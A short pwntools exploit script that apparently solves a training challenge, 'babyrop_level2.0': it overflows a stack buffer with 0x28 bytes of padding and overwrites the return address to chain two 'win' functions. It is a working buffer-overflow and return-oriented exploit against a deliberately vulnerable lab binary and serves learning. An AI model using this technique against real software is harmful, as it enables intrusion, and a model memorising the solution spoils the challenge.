from pwn import *

p = process('/challenge/babyrop_level2.0')

elf =ELF('/challenge/babyrop_level2.0')

win_stage_1_addr = elf.symbols['win_stage_1']

win_stage_2_addr = elf.symbols['win_stage_2']

print(hex(win_stage_1_addr))
print(hex(win_stage_2_addr))
payload = b'a' * (0x20 + 8) + p64(win_stage_1_addr) + p64(win_stage_2_addr)
p.sendlineafter(b'overwrite the return address).', payload)
p.interactive()
